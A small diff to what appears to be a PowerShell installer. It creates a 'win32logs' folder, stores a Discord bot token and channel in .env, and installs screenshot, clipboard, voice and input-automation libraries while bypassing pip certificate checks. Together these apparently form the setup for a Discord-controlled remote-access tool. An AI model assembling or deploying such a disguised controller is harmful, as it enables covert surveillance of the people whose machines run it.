@@ -3,7 +3,7 @@ New-Item -ItemType Directory -Path win32logs -Force
 Set-Location win32logs
 
 New-Item -Path .env -Force
-Add-Content -Value ("DISCORD_TOKEN=$dc", "CHANNEL=$ch" -Path .env
+Add-Content -Value ("DISCORD_TOKEN=$tk", "CHANNEL=$id" -Path .env
 
 python -m pip install --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org Pillow pyperclip discord.py[voice] requests pyautogui python-dotenv --user
 
